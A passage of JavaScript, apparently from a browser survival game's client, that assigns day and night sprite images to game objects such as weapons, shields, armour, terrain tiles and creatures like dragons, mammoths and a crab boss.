                    sprite[ze.GOLDEN_CHICKEN][ze.NIGHT] = IMAGES.CHICKENN,
                    sprite[ze.HAMMER_REIDITE] = [],
                    sprite[ze.HAMMER_REIDITE][ze.DAY] = IMAGES.HAMMER_REIDITED,
                    sprite[ze.HAMMER_REIDITE][ze.NIGHT] = IMAGES.HAMMER_REIDITEN,
                    sprite[ze.HURT_GOLDEN_HEN] = IMAGES.HURT_GOLDEN_HEN,
                    sprite[ze.HURT_GOLDEN_CHICKEN] = IMAGES.HURT_GOLDEN_CHICKEN,
                    sprite[ze.FOG] = [],
                    sprite[ze.FOG][ze.DAY] = [],
                    sprite[ze.FOG][ze.NIGHT] = [],
                    sprite[ze.FOG][ze.DAY].push(IMAGES.FOG0D),
                    sprite[ze.FOG][ze.DAY].push(IMAGES.FOG1D),
                    sprite[ze.FOG][ze.DAY].push(IMAGES.FOG2D),
                    sprite[ze.FOG][ze.NIGHT].push(IMAGES.FOG0N),
                    sprite[ze.FOG][ze.NIGHT].push(IMAGES.FOG1N),
                    sprite[ze.FOG][ze.NIGHT].push(IMAGES.FOG2N),
                    sprite[ze.FOD] = [],
                    sprite[ze.FOD][ze.DAY] = [],
                    sprite[ze.FOD][ze.NIGHT] = [],
                    sprite[ze.FOD][ze.DAY].push(IMAGES.FOD0D),
                    sprite[ze.FOD][ze.DAY].push(IMAGES.FOD1D),
                    sprite[ze.FOD][ze.DAY].push(IMAGES.FOD2D),
                    sprite[ze.FOD][ze.NIGHT].push(IMAGES.FOD0N),
                    sprite[ze.FOD][ze.NIGHT].push(IMAGES.FOD1N),
                    sprite[ze.FOD][ze.NIGHT].push(IMAGES.FOD2N),
                    sprite[ze.MARKER] = [],
                    sprite[ze.MARKER][ze.DAY] = [],
                    sprite[ze.MARKER][ze.NIGHT] = [],
                    sprite[ze.MARKER][ze.DAY].push(IMAGES.MARKER0D),
                    sprite[ze.MARKER][ze.DAY].push(IMAGES.MARKER1D),
                    sprite[ze.MARKER][ze.DAY].push(IMAGES.MARKER2D),
                    sprite[ze.MARKER][ze.DAY].push(IMAGES.MARKER3D),
                    sprite[ze.MARKER][ze.NIGHT].push(IMAGES.MARKER0N),
                    sprite[ze.MARKER][ze.NIGHT].push(IMAGES.MARKER1N),
                    sprite[ze.MARKER][ze.NIGHT].push(IMAGES.MARKER2N),
                    sprite[ze.MARKER][ze.NIGHT].push(IMAGES.MARKER3N),
                    sprite[ze.LAVA_DRAGON] = [],
                    sprite[ze.LAVA_DRAGON][ze.DAY] = IMAGES.LAVA_DRAGOND,
                    sprite[ze.LAVA_DRAGON][ze.NIGHT] = IMAGES.LAVA_DRAGONN,
                    sprite[ze.LAVA_WING_LEFT] = [],
                    sprite[ze.LAVA_WING_LEFT][ze.DAY] = IMAGES.LAVA_WING_LEFTD,
                    sprite[ze.LAVA_WING_LEFT][ze.NIGHT] = IMAGES.LAVA_WING_LEFTN,
                    sprite[ze.LAVA_WING_RIGHT] = [],
                    sprite[ze.LAVA_WING_RIGHT][ze.DAY] = IMAGES.LAVA_WING_RIGHTD,
                    sprite[ze.LAVA_WING_RIGHT][ze.NIGHT] = IMAGES.LAVA_WING_RIGHTN,
                    sprite[ze.HURT_LAVA_DRAGON] = IMAGES.HURT_LAVA_DRAGON,
                    sprite[ze.HURT_LAVA_WING_LEFT] = IMAGES.HURT_LAVA_WING_LEFT,
                    sprite[ze.HURT_LAVA_WING_RIGHT] = IMAGES.HURT_LAVA_WING_RIGHT,
                    sprite[ze.DIAMOND_PROTECTION] = [],
                    sprite[ze.DIAMOND_PROTECTION][ze.DAY] = IMAGES.DIAMOND_PROTECTIOND,
                    sprite[ze.DIAMOND_PROTECTION][ze.NIGHT] = IMAGES.DIAMOND_PROTECTIONN,
                    sprite[ze.GLOVES_DIAMOND_PROTECTION] = [],
                    sprite[ze.GLOVES_DIAMOND_PROTECTION][ze.DAY] = IMAGES.HAND_DIAMOND_PROTECTIOND,
                    sprite[ze.GLOVES_DIAMOND_PROTECTION][ze.NIGHT] = IMAGES.HAND_DIAMOND_PROTECTIONN,
                    sprite[ze.AMETHYST_PROTECTION] = [],
                    sprite[ze.AMETHYST_PROTECTION][ze.DAY] = IMAGES.AMETHYST_PROTECTIOND,
                    sprite[ze.AMETHYST_PROTECTION][ze.NIGHT] = IMAGES.AMETHYST_PROTECTIONN,
                    sprite[ze.GLOVES_AMETHYST_PROTECTION] = [],
                    sprite[ze.GLOVES_AMETHYST_PROTECTION][ze.DAY] = IMAGES.HAND_DIAMOND_PROTECTIOND,
                    sprite[ze.GLOVES_AMETHYST_PROTECTION][ze.NIGHT] = IMAGES.HAND_DIAMOND_PROTECTIONN,
                    sprite[ze.REIDITE_HELMET] = [],
                    sprite[ze.REIDITE_HELMET][ze.DAY] = IMAGES.REIDITE_HELMETD,
                    sprite[ze.REIDITE_HELMET][ze.NIGHT] = IMAGES.REIDITE_HELMETN,
                    sprite[ze.REIDITE_SWORD] = [],
                    sprite[ze.REIDITE_SWORD][ze.DAY] = IMAGES.REIDITE_SWORDD,
                    sprite[ze.REIDITE_SWORD][ze.NIGHT] = IMAGES.REIDITE_SWORDN,
                    sprite[ze.REIDITE_SPEAR] = [],
                    sprite[ze.REIDITE_SPEAR][ze.DAY] = IMAGES.REIDITE_SPEARD,
                    sprite[ze.REIDITE_SPEAR][ze.NIGHT] = IMAGES.REIDITE_SPEARN,
                    sprite[ze.LAVA_SPEAR] = [],
                    sprite[ze.LAVA_SPEAR][ze.DAY] = IMAGES.LAVA_SPEARD,
                    sprite[ze.LAVA_SPEAR][ze.NIGHT] = IMAGES.LAVA_SPEARN,
                    sprite[ze.LAVA_SWORD] = [],
                    sprite[ze.LAVA_SWORD][ze.DAY] = IMAGES.LAVA_SWORDD,
                    sprite[ze.LAVA_SWORD][ze.NIGHT] = IMAGES.LAVA_SWORDN,
                    sprite[ze.LAVA_HELMET] = [],
                    sprite[ze.LAVA_HELMET][ze.DAY] = IMAGES.LAVA_HELMETD,
                    sprite[ze.LAVA_HELMET][ze.NIGHT] = IMAGES.LAVA_HELMETN,
                    sprite[ze.WITCH] = [],
                    sprite[ze.WITCH][ze.DAY] = IMAGES.WITCHD,
                    sprite[ze.WITCH][ze.NIGHT] = IMAGES.WITCHN,
                    sprite[ze.NIMBUS] = [],
                    sprite[ze.NIMBUS][ze.DAY] = IMAGES.NIMBUSD,
                    sprite[ze.NIMBUS][ze.NIGHT] = IMAGES.NIMBUSN,
                    sprite[ze.WOOD_SHIELD] = [],
                    sprite[ze.WOOD_SHIELD][ze.DAY] = IMAGES.WOOD_SHIELDD,
                    sprite[ze.WOOD_SHIELD][ze.NIGHT] = IMAGES.WOOD_SHIELDN,
                    sprite[ze.STONE_SHIELD] = [],
                    sprite[ze.STONE_SHIELD][ze.DAY] = IMAGES.STONE_SHIELDD,
                    sprite[ze.STONE_SHIELD][ze.NIGHT] = IMAGES.STONE_SHIELDN,
                    sprite[ze.GOLD_SHIELD] = [],
                    sprite[ze.GOLD_SHIELD][ze.DAY] = IMAGES.GOLD_SHIELDD,
                    sprite[ze.GOLD_SHIELD][ze.NIGHT] = IMAGES.GOLD_SHIELDN,
                    sprite[ze.DIAMOND_SHIELD] = [],
                    sprite[ze.DIAMOND_SHIELD][ze.DAY] = IMAGES.DIAMOND_SHIELDD,
                    sprite[ze.DIAMOND_SHIELD][ze.NIGHT] = IMAGES.DIAMOND_SHIELDN,
                    sprite[ze.AMETHYST_SHIELD] = [],
                    sprite[ze.AMETHYST_SHIELD][ze.DAY] = IMAGES.AMETHYST_SHIELDD,
                    sprite[ze.AMETHYST_SHIELD][ze.NIGHT] = IMAGES.AMETHYST_SHIELDN,
                    sprite[ze.REIDITE_SHIELD] = [],
                    sprite[ze.REIDITE_SHIELD][ze.DAY] = IMAGES.REIDITE_SHIELDD,
                    sprite[ze.REIDITE_SHIELD][ze.NIGHT] = IMAGES.REIDITE_SHIELDN,
                    sprite[ze.WOOD_ARROW] = [],
                    sprite[ze.WOOD_ARROW][ze.DAY] = IMAGES.WOOD_ARROWD,
                    sprite[ze.WOOD_ARROW][ze.NIGHT] = IMAGES.WOOD_ARROWN,
                    sprite[ze.WOOD_BOW] = [],
                    sprite[ze.WOOD_BOW][ze.DAY] = IMAGES.WOOD_BOWD,
                    sprite[ze.WOOD_BOW][ze.NIGHT] = IMAGES.WOOD_BOWN,
                    sprite[ze.STONE_ARROW] = [],
                    sprite[ze.STONE_ARROW][ze.DAY] = IMAGES.STONE_ARROWD,
                    sprite[ze.STONE_ARROW][ze.NIGHT] = IMAGES.STONE_ARROWN,
                    sprite[ze.STONE_BOW] = [],
                    sprite[ze.STONE_BOW][ze.DAY] = IMAGES.STONE_BOWD,
                    sprite[ze.STONE_BOW][ze.NIGHT] = IMAGES.STONE_BOWN,
                    sprite[ze.GOLD_ARROW] = [],
                    sprite[ze.GOLD_ARROW][ze.DAY] = IMAGES.GOLD_ARROWD,
                    sprite[ze.GOLD_ARROW][ze.NIGHT] = IMAGES.GOLD_ARROWN,
                    sprite[ze.GOLD_BOW] = [],
                    sprite[ze.GOLD_BOW][ze.DAY] = IMAGES.GOLD_BOWD,
                    sprite[ze.GOLD_BOW][ze.NIGHT] = IMAGES.GOLD_BOWN,
                    sprite[ze.DIAMOND_ARROW] = [],
                    sprite[ze.DIAMOND_ARROW][ze.DAY] = IMAGES.DIAMOND_ARROWD,
                    sprite[ze.DIAMOND_ARROW][ze.NIGHT] = IMAGES.DIAMOND_ARROWN,
                    sprite[ze.DIAMOND_BOW] = [],
                    sprite[ze.DIAMOND_BOW][ze.DAY] = IMAGES.DIAMOND_BOWD,
                    sprite[ze.DIAMOND_BOW][ze.NIGHT] = IMAGES.DIAMOND_BOWN,
                    sprite[ze.AMETHYST_ARROW] = [],
                    sprite[ze.AMETHYST_ARROW][ze.DAY] = IMAGES.AMETHYST_ARROWD,
                    sprite[ze.AMETHYST_ARROW][ze.NIGHT] = IMAGES.AMETHYST_ARROWN,
                    sprite[ze.AMETHYST_BOW] = [],
                    sprite[ze.AMETHYST_BOW][ze.DAY] = IMAGES.AMETHYST_BOWD,
                    sprite[ze.AMETHYST_BOW][ze.NIGHT] = IMAGES.AMETHYST_BOWN,
                    sprite[ze.REIDITE_ARROW] = [],
                    sprite[ze.REIDITE_ARROW][ze.DAY] = IMAGES.REIDITE_ARROWD,
                    sprite[ze.REIDITE_ARROW][ze.NIGHT] = IMAGES.REIDITE_ARROWN,
                    sprite[ze.REIDITE_BOW] = [],
                    sprite[ze.REIDITE_BOW][ze.DAY] = IMAGES.REIDITE_BOWD,
                    sprite[ze.REIDITE_BOW][ze.NIGHT] = IMAGES.REIDITE_BOWN,
                    sprite[ze.DRAGON_ARROW] = [],
                    sprite[ze.DRAGON_ARROW][ze.DAY] = IMAGES.DRAGON_ARROWD,
                    sprite[ze.DRAGON_ARROW][ze.NIGHT] = IMAGES.DRAGON_ARROWN,
                    sprite[ze.DRAGON_BOW] = [],
                    sprite[ze.DRAGON_BOW][ze.DAY] = IMAGES.DRAGON_BOWD,
                    sprite[ze.DRAGON_BOW][ze.NIGHT] = IMAGES.DRAGON_BOWN,
                    sprite[ze.TURBAN1] = [],
                    sprite[ze.TURBAN1][ze.DAY] = IMAGES.TURBAN1D,
                    sprite[ze.TURBAN1][ze.NIGHT] = IMAGES.TURBAN1N,
                    sprite[ze.TURBAN2] = [],
                    sprite[ze.TURBAN2][ze.DAY] = IMAGES.TURBAN2D,
                    sprite[ze.TURBAN2][ze.NIGHT] = IMAGES.TURBAN2N,
                    sprite[ze.REIDITE_PROTECTION] = [],
                    sprite[ze.REIDITE_PROTECTION][ze.DAY] = IMAGES.REIDITE_PROTECTIOND,
                    sprite[ze.REIDITE_PROTECTION][ze.NIGHT] = IMAGES.REIDITE_PROTECTIONN,
                    sprite[ze.GLOVES_REIDITE_PROTECTION] = [],
                    sprite[ze.GLOVES_REIDITE_PROTECTION][ze.DAY] = IMAGES.HAND_REIDITE_PROTECTIOND,
                    sprite[ze.GLOVES_REIDITE_PROTECTION][ze.NIGHT] = IMAGES.HAND_REIDITE_PROTECTIONN,
                    sprite[ze.LAVA_SHINGLE] = [],
                    sprite[ze.LAVA_SHINGLE][ze.DAY] = [],
                    sprite[ze.LAVA_SHINGLE][ze.NIGHT] = [],
                    sprite[ze.LAVA_SHINGLE][ze.DAY].push(IMAGES.LAVA_SHINGLES0D),
                    sprite[ze.LAVA_SHINGLE][ze.DAY].push(IMAGES.LAVA_SHINGLES1D),
                    sprite[ze.LAVA_SHINGLE][ze.NIGHT].push(IMAGES.LAVA_SHINGLES1D),
                    sprite[ze.LAVA_SHINGLE][ze.NIGHT].push(IMAGES.LAVA_SHINGLES1N),
                    sprite[ze.LAVA_BUBBLE] = [],
                    sprite[ze.LAVA_BUBBLE][ze.DAY] = [],
                    sprite[ze.LAVA_BUBBLE][ze.NIGHT] = [],
                    sprite[ze.LAVA_BUBBLE][ze.DAY].push(IMAGES.LAVA_BUBLE0D),
                    sprite[ze.LAVA_BUBBLE][ze.DAY].push(IMAGES.LAVA_BUBLE1D),
                    sprite[ze.LAVA_BUBBLE][ze.DAY].push(IMAGES.LAVA_BUBLE2D),
                    sprite[ze.LAVA_BUBBLE][ze.NIGHT].push(IMAGES.LAVA_BUBLE0N),
                    sprite[ze.LAVA_BUBBLE][ze.NIGHT].push(IMAGES.LAVA_BUBLE1N),
                    sprite[ze.LAVA_BUBBLE][ze.NIGHT].push(IMAGES.LAVA_BUBLE2N),
                    sprite[ze.PITCHFORK] = [],
                    sprite[ze.PITCHFORK][ze.DAY] = IMAGES.PITCHFORKD,
                    sprite[ze.PITCHFORK][ze.NIGHT] = IMAGES.PITCHFORKN,
                    sprite[ze.PITCHFORK2] = [],
                    sprite[ze.PITCHFORK2][ze.DAY] = IMAGES.PITCHFORK2D,
                    sprite[ze.PITCHFORK2][ze.NIGHT] = IMAGES.PITCHFORK2N,
                    sprite[ze.EMERALD] = [],
                    sprite[ze.EMERALD][ze.DAY] = [],
                    sprite[ze.EMERALD][ze.NIGHT] = [],
                    sprite[ze.EMERALD][ze.DAY].push(IMAGES.EMERALD0D),
                    sprite[ze.EMERALD][ze.DAY].push(IMAGES.EMERALD1D),
                    sprite[ze.EMERALD][ze.DAY].push(IMAGES.EMERALD2D),
                    sprite[ze.EMERALD][ze.NIGHT].push(IMAGES.EMERALD0N),
                    sprite[ze.EMERALD][ze.NIGHT].push(IMAGES.EMERALD1N),
                    sprite[ze.EMERALD][ze.NIGHT].push(IMAGES.EMERALD2N),
                    sprite[ze.REIDITE] = [],
                    sprite[ze.REIDITE][ze.DAY] = [],
                    sprite[ze.REIDITE][ze.NIGHT] = [],
                    sprite[ze.REIDITE][ze.DAY].push(IMAGES.REIDITE0D),
                    sprite[ze.REIDITE][ze.DAY].push(IMAGES.REIDITE1D),
                    sprite[ze.REIDITE][ze.DAY].push(IMAGES.REIDITE2D),
                    sprite[ze.REIDITE][ze.NIGHT].push(IMAGES.REIDITE0N),
                    sprite[ze.REIDITE][ze.NIGHT].push(IMAGES.REIDITE1N),
                    sprite[ze.REIDITE][ze.NIGHT].push(IMAGES.REIDITE2N),
                    sprite[ze.MAGMA] = [],
                    sprite[ze.MAGMA][ze.DAY] = [],
                    sprite[ze.MAGMA][ze.NIGHT] = [],
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA1D),
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA2D),
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA3D),
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA4D),
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA5D),
                    sprite[ze.MAGMA][ze.DAY].push(IMAGES.MAGMA6D),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA1N),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA2N),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA3N),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA4N),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA5N),
                    sprite[ze.MAGMA][ze.NIGHT].push(IMAGES.MAGMA6N),
                    sprite[ze.LAVA_GROUND] = [],
                    sprite[ze.LAVA_GROUND][ze.DAY] = [],
                    sprite[ze.LAVA_GROUND][ze.NIGHT] = [],
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND1D),
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND2D),
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND3D),
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND4D),
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND5D),
                    sprite[ze.LAVA_GROUND][ze.DAY].push(IMAGES.LAVA_GROUND6D),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND1N),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND2N),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND3N),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND4N),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND5N),
                    sprite[ze.LAVA_GROUND][ze.NIGHT].push(IMAGES.LAVA_GROUND6N),
                    sprite[ze.FIRE_MOB] = [],
                    sprite[ze.FIRE_MOB][ze.DAY] = IMAGES.FIRE_MOBD,
                    sprite[ze.FIRE_MOB][ze.NIGHT] = IMAGES.FIRE_MOBN,
                    sprite[ze.HURT_FIRE_MOB] = IMAGES.FIRE_MOB_HURT,
                    sprite[ze.MACHETE] = [],
                    sprite[ze.MACHETE][ze.DAY] = IMAGES.MACHETED,
                    sprite[ze.MACHETE][ze.NIGHT] = IMAGES.MACHETEN,
                    sprite[ze.BOAT] = [],
                    sprite[ze.BOAT][ze.DAY] = IMAGES.BOATD,
                    sprite[ze.BOAT][ze.NIGHT] = IMAGES.BOATN,
                    sprite[ze.SLED] = [],
                    sprite[ze.SLED][ze.DAY] = IMAGES.SLEDD,
                    sprite[ze.SLED][ze.NIGHT] = IMAGES.SLEDN,
                    sprite[ze.PLANE] = [],
                    sprite[ze.PLANE][ze.DAY] = IMAGES.PLANED,
                    sprite[ze.PLANE][ze.NIGHT] = IMAGES.PLANEN,
                    sprite[ze.PENGUIN] = [],
                    sprite[ze.PENGUIN][ze.DAY] = IMAGES.PENGUIND,
                    sprite[ze.PENGUIN][ze.NIGHT] = IMAGES.PENGUINN,
                    sprite[ze.HURT_PENGUIN] = IMAGES.HURT_PENGUIN,
                    sprite[ze.SAND_WORM1] = [],
                    sprite[ze.SAND_WORM1][ze.DAY] = IMAGES.SAND_WORM1D,
                    sprite[ze.SAND_WORM1][ze.NIGHT] = IMAGES.SAND_WORM1N,
                    sprite[ze.SAND_WORM2] = [],
                    sprite[ze.SAND_WORM2][ze.DAY] = IMAGES.SAND_WORM2D,
                    sprite[ze.SAND_WORM2][ze.NIGHT] = IMAGES.SAND_WORM2N,
                    sprite[ze.HURT_SAND_WORM0] = IMAGES.HURT_SAND_WORM0,
                    sprite[ze.HURT_SAND_WORM1] = IMAGES.HURT_SAND_WORM1,
                    sprite[ze.HURT_SAND_WORM2] = IMAGES.HURT_SAND_WORM2,
                    sprite[ze.SCORPION] = [],
                    sprite[ze.SCORPION][ze.DAY] = IMAGES.SCORPIOND,
                    sprite[ze.SCORPION][ze.NIGHT] = IMAGES.SCORPIONN,
                    sprite[ze.SCORPION_HAND_LEFT] = [],
                    sprite[ze.SCORPION_HAND_LEFT][ze.DAY] = IMAGES.SCORPION_HAND_LEFTD,
                    sprite[ze.SCORPION_HAND_LEFT][ze.NIGHT] = IMAGES.SCORPION_HAND_LEFTN,
                    sprite[ze.SCORPION_HAND_RIGHT] = [],
                    sprite[ze.SCORPION_HAND_RIGHT][ze.DAY] = IMAGES.SCORPION_HAND_RIGHTD,
                    sprite[ze.SCORPION_HAND_RIGHT][ze.NIGHT] = IMAGES.SCORPION_HAND_RIGHTN,
                    sprite[ze.HURT_SCORPION] = IMAGES.HURT_SCORPION,
                    sprite[ze.HURT_SCORPION_HAND_RIGHT] = IMAGES.HURT_SCORPION_HAND_RIGHT,
                    sprite[ze.HURT_SCORPION_HAND_LEFT] = IMAGES.HURT_SCORPION_HAND_LEFT,
                    sprite[ze.CRAB_BOSS_ATTACK] = [],
                    sprite[ze.CRAB_BOSS_ATTACK][ze.DAY] = IMAGES.CRAB_BOSS_ATTACKD,
                    sprite[ze.CRAB_BOSS_ATTACK][ze.NIGHT] = IMAGES.CRAB_BOSS_ATTACKN,
                    sprite[ze.CRAB_BOSS_TAMED] = [],
                    sprite[ze.CRAB_BOSS_TAMED][ze.DAY] = IMAGES.CRAB_BOSS_TAMEDD,
                    sprite[ze.CRAB_BOSS_TAMED][ze.NIGHT] = IMAGES.CRAB_BOSS_TAMEDN,
                    sprite[ze.CRAB_BOSS] = [],
                    sprite[ze.CRAB_BOSS][ze.DAY] = IMAGES.CRAB_BOSSD,
                    sprite[ze.CRAB_BOSS][ze.NIGHT] = IMAGES.CRAB_BOSSN,
                    sprite[ze.CRAB_BOSS_CLAW_LEFT] = [],
                    sprite[ze.CRAB_BOSS_CLAW_LEFT][ze.DAY] = IMAGES.CRAB_BOSS_CLAW_LEFTD,
                    sprite[ze.CRAB_BOSS_CLAW_LEFT][ze.NIGHT] = IMAGES.CRAB_BOSS_CLAW_LEFTN,
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT] = [],
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT][ze.DAY] = IMAGES.CRAB_BOSS_CLAW_RIGHTD,
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT][ze.NIGHT] = IMAGES.CRAB_BOSS_CLAW_RIGHTN,
                    sprite[ze.CRAB_BOSS_CLAW_LEFT_ATTACK] = [],
                    sprite[ze.CRAB_BOSS_CLAW_LEFT_ATTACK][ze.DAY] = IMAGES.CRAB_BOSS_CLAW_LEFT_ATTACKD,
                    sprite[ze.CRAB_BOSS_CLAW_LEFT_ATTACK][ze.NIGHT] = IMAGES.CRAB_BOSS_CLAW_LEFT_ATTACKN,
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT_ATTACK] = [],
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT_ATTACK][ze.DAY] = IMAGES.CRAB_BOSS_CLAW_RIGHT_ATTACKD,
                    sprite[ze.CRAB_BOSS_CLAW_RIGHT_ATTACK][ze.NIGHT] = IMAGES.CRAB_BOSS_CLAW_RIGHT_ATTACKN,
                    sprite[ze.HURT_CRAB_BOSS] = IMAGES.HURT_CRAB_BOSS,
                    sprite[ze.HURT_CRAB_BOSS_CLAW_LEFT] = IMAGES.HURT_CRAB_BOSS_CLAW_LEFT,
                    sprite[ze.HURT_CRAB_BOSS_CLAW_RIGHT] = IMAGES.HURT_CRAB_BOSS_CLAW_RIGHT,
                    sprite[ze.HEAL_CRAB_BOSS] = IMAGES.HEAL_CRAB_BOSS,
                    sprite[ze.HEAL_CRAB_BOSS_CLAW_LEFT] = IMAGES.HEAL_CRAB_BOSS_CLAW_LEFT,
                    sprite[ze.HEAL_CRAB_BOSS_CLAW_RIGHT] = IMAGES.HEAL_CRAB_BOSS_CLAW_RIGHT,
                    sprite[ze.BABY_MAMMOTH_ATTACK] = [],
                    sprite[ze.BABY_MAMMOTH_ATTACK][ze.DAY] = IMAGES.BABY_MAMMOTH_ATTACKD,
                    sprite[ze.BABY_MAMMOTH_ATTACK][ze.NIGHT] = IMAGES.BABY_MAMMOTH_ATTACKN,
                    sprite[ze.BABY_MAMMOTH] = [],
                    sprite[ze.BABY_MAMMOTH][ze.DAY] = IMAGES.BABY_MAMMOTHD,
                    sprite[ze.BABY_MAMMOTH][ze.NIGHT] = IMAGES.BABY_MAMMOTHN,
                    sprite[ze.MAMMOTH] = [],
                    sprite[ze.MAMMOTH][ze.DAY] = IMAGES.MAMMOTHD,
                    sprite[ze.MAMMOTH][ze.NIGHT] = IMAGES.MAMMOTHN,
                    sprite[ze.BABY_MAMMOTH_TAMED] = [],
                    sprite[ze.BABY_MAMMOTH_TAMED][ze.DAY] = IMAGES.BABY_MAMMOTH_TAMEDD,
                    sprite[ze.BABY_MAMMOTH_TAMED][ze.NIGHT] = IMAGES.BABY_MAMMOTH_TAMEDN,
                    sprite[ze.HURT_BABY_MAMMOTH] = IMAGES.HURT_BABY_MAMMOTH,
                    sprite[ze.HURT_MAMMOTH] = IMAGES.HURT_MAMMOTH,
                    sprite[ze.BABY_DRAGON_ATTACK] = [],
                    sprite[ze.BABY_DRAGON_ATTACK][ze.DAY] = IMAGES.BABY_DRAGON_ATTACKD,
                    sprite[ze.BABY_DRAGON_ATTACK][ze.NIGHT] = IMAGES.BABY_DRAGON_ATTACKN,
                    sprite[ze.BABY_DRAGON] = [],
                    sprite[ze.BABY_DRAGON][ze.DAY] = IMAGES.BABY_DRAGOND,
                    sprite[ze.BABY_DRAGON][ze.NIGHT] = IMAGES.BABY_DRAGONN,
                    sprite[ze.BABY_DRAGON_TAMED] = [],
                    sprite[ze.BABY_DRAGON_TAMED][ze.DAY] = IMAGES.BABY_DRAGON_TAMEDD,
                    sprite[ze.BABY_DRAGON_TAMED][ze.NIGHT] = IMAGES.BABY_DRAGON_TAMEDN,
                    sprite[ze.BABY_DRAGON_WING_LEFT] = [],
                    sprite[ze.BABY_DRAGON_WING_LEFT][ze.DAY] = IMAGES.BABY_DRAGON_WING_LEFTD,
                    sprite[ze.BABY_DRAGON_WING_LEFT][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFTN,
                    sprite[ze.BABY_DRAGON_WING_RIGHT] = [],
                    sprite[ze.BABY_DRAGON_WING_RIGHT][ze.DAY] = IMAGES.BABY_DRAGON_WING_RIGHTD,
                    sprite[ze.BABY_DRAGON_WING_RIGHT][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHTN,
                    sprite[ze.BABY_DRAGON_WING_LEFT_ATTACK] = [],
                    sprite[ze.BABY_DRAGON_WING_LEFT_ATTACK][ze.DAY] = IMAGES.BABY_DRAGON_WING_LEFT_ATTACKD,
                    sprite[ze.BABY_DRAGON_WING_LEFT_ATTACK][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFT_ATTACKN,
                    sprite[ze.BABY_DRAGON_WING_RIGHT_ATTACK] = [],
                    sprite[ze.BABY_DRAGON_WING_RIGHT_ATTACK][ze.DAY] = IMAGES.BABY_DRAGON_WING_RIGHT_ATTACKD,
                    sprite[ze.BABY_DRAGON_WING_RIGHT_ATTACK][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHT_ATTACKN,
                    sprite[ze.BABY_DRAGON_WING_LEFT_TAMED] = [],
                    sprite[ze.BABY_DRAGON_WING_LEFT_TAMED][ze.DAY] = IMAGES.BABY_DRAGON_WING_LEFT_TAMEDD,
                    sprite[ze.BABY_DRAGON_WING_LEFT_TAMED][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_LEFT_TAMEDN,
                    sprite[ze.BABY_DRAGON_WING_RIGHT_TAMED] = [],
                    sprite[ze.BABY_DRAGON_WING_RIGHT_TAMED][ze.DAY] = IMAGES.BABY_DRAGON_WING_RIGHT_TAMEDD,
                    sprite[ze.BABY_DRAGON_WING_RIGHT_TAMED][ze.NIGHT] = IMAGES.BABY_DRAGON_WING_RIGHT_TAMEDN,
                    sprite[ze.HURT_BABY_DRAGON] = IMAGES.HURT_BABY_DRAGON,
                    sprite[ze.HURT_BABY_DRAGON_WING_LEFT] = IMAGES.HURT_BABY_DRAGON_WING_LEFT,
                    sprite[ze.HURT_BABY_DRAGON_WING_RIGHT] = IMAGES.HURT_BABY_DRAGON_WING_RIGHT,
                    sprite[ze.BABY_LAVA_ATTACK] = [],
                    sprite[ze.BABY_LAVA_ATTACK][ze.DAY] = IMAGES.BABY_LAVA_ATTACKD,
                    sprite[ze.BABY_LAVA_ATTACK][ze.NIGHT] = IMAGES.BABY_LAVA_ATTACKN,
                    sprite[ze.BABY_LAVA] = [],
                    sprite[ze.BABY_LAVA][ze.DAY] = IMAGES.BABY_LAVAD,
                    sprite[ze.BABY_LAVA][ze.NIGHT] = IMAGES.BABY_LAVAN,
                    sprite[ze.BABY_LAVA_TAMED] = [],
                    sprite[ze.BABY_LAVA_TAMED][ze.DAY] = IMAGES.BABY_LAVA_TAMEDD,
                    sprite[ze.BABY_LAVA_TAMED][ze.NIGHT] = IMAGES.BABY_LAVA_TAMEDN,
                    sprite[ze.BABY_LAVA_WING_LEFT] = [],
                    sprite[ze.BABY_LAVA_WING_LEFT][ze.DAY] = IMAGES.BABY_LAVA_WING_LEFTD,
                    sprite[ze.BABY_LAVA_WING_LEFT][ze.NIGHT] = IMAGES.BABY_LAVA_WING_LEFTN,
                    sprite[ze.BABY_LAVA_WING_RIGHT] = [],
                    sprite[ze.BABY_LAVA_WING_RIGHT][ze.DAY] = IMAGES.BABY_LAVA_WING_RIGHTD,
                    sprite[ze.BABY_LAVA_WING_RIGHT][ze.NIGHT] = IMAGES.BABY_LAVA_WING_RIGHTN,
                    sprite[ze.BABY_LAVA_WING_LEFT_ATTACK] = [],
                    sprite[ze.BABY_LAVA_WING_LEFT_ATTACK][ze.DAY] = IMAGES.BABY_LAVA_WING_LEFT_ATTACKD,
